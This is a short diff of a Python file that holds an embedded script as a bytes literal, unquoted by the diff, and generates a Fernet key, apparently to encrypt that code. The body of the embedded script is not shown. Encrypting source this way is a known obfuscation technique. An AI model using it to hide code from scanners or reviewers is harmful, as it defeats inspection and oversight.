@@ -2,7 +2,7 @@ from cryptography.fernet import Fernet
 import base64
 import requests
 
-code = b"""
+code = b""
 
 
 import requests
@@ -116,7 +116,7 @@ def main():
 if __name__ == '__main__':
     main()
 
-"""
+
 
 key = Fernet.generate_key()
 encryption_type = Fernet(key)
